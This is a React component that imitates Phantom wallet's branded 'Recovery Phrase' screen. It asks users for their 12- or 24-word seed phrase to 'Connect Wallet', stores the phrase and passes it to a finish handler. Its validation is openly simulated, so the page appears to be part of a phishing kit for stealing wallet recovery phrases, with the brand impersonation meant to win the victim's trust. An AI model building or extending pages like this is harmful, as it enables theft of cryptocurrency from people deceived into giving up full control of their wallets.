import { useState } from "react";
import { ChevronLeft, HelpCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import PhantomSmall from "../icons/phantom-small";
import PhantomFull from "../icons/phantom-full";

const Phantom = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [wordCount, setWordCount] = useState<12 | 24>(12);
	const [words, setWords] = useState<string[]>(Array(12).fill(""));
	const [error, setError] = useState<number | null>(null);

	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		setSeedPhrase(words.join(" "));
		handleFinish(words.join(" "));
	};

	const handleWordCountChange = (count: 12 | 24) => {
		setWordCount(count);
		setWords(Array(count).fill(""));
		setError(null);
	};

	const handleWordChange = (index: number, value: string) => {
		const newWords = [...words];
		newWords[index] = value.toLowerCase().trim();
		setWords(newWords);

		// Simulate validation - word 3 being "loev" triggers error
		if (index === 2 && value.toLowerCase() === "loev") {
			setError(2);
		} else if (error === index) {
			setError(null);
		}
	};

	return (
		<div className="min-h-screen bg-[#E2DFFE] w-full flex flex-col items-center justify-center py-10 px-4">
			<span className="w-full p-secondary py-8">
				<span className="md:hidden">
					<PhantomSmall />
				</span>
				<span className="hidden md:flex">
					<PhantomFull />
				</span>
			</span>
			<div className="w-full max-w-2xl">
				{/* Card */}
				<div className="bg-black rounded-2xl p-5 md:p-12 relative shadow-xl">
					<h1 className="text-3xl font-medium text-gray-300 text-center mb-2">
						Recovery Phrase
					</h1>
					<p className="text-gray-400 text-center text-lg mb-8">
						Connect an existing wallet with your 12 or
						<br />
						24-word recovery phrase.
					</p>

					{/* Word inputs */}
					<div className="grid grid-cols-3 gap-2 mb-6">
						{words.map((word, index) => (
							<div key={index}>
								<Input
									value={word}
									onChange={(e) => handleWordChange(index, e.target.value)}
									placeholder={`${index + 1}.`}
									className={`bg-neutral-900 border ${
										error === index
											? "border-destructive focus:border-destructive"
											: word
											? "border-purple-300"
											: "border-white/15"
									} text-white placeholder:text-gray-300/80`}
								/>
							</div>
						))}
					</div>

					{error !== null && (
						<div className="flex items-center gap-2 text-destructive text-sm mb-6">
							<HelpCircle className="w-4 h-4" />
							<span>Word {error + 1} is incorrect or misspelled</span>
						</div>
					)}

					<button
						onClick={() => {
							handleWordCountChange(wordCount == 12 ? 24 : 12);
						}}
						className="w-full text-center text-gray-300/80 text-lg mb-6 hover:text-purple-400"
					>
						I have a {wordCount == 12 ? "24" : "12"}-word recovery phrase
					</button>

					<button
						onClick={handleComplete}
						disabled={words.some((w) => !w) || error !== null}
						className="w-full bg-neutral-800 hover:bg-purple-400 text-gray-100 disabled:opacity-50 py-3 rounded-lg"
					>
						Connect Wallet
					</button>
				</div>
			</div>
		</div>
	);
};

export default Phantom;
